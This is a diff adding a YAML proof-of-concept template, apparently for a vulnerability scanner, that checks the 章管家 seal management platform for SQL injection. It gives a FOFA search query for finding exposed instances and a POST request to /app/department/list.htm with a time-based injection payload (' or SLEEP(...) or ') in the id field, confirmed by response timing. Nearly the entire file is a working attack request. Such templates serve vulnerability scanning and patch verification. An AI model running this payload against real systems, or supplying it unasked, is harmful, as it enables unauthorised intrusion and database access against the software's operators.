@@ -1,0 +1,20 @@
+id: poc-yaml-zhangin-list-htm-sqli
+info:
+  name: 章管家 list.htm SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 印章智慧管理平台
+  fofa: body="章管家登录-公章在外防私盖"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /app/department/list.htm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: token=dingtalk_token&person_id=1&unit_id=1&id=' or SLEEP({{.t1}}) or '
+  expression: status_code == 200 && contains(body,`"status":"1"`) && contains(body,"未查询到相关数据")
+    && duration > t1 && duration < t2
+transport: http
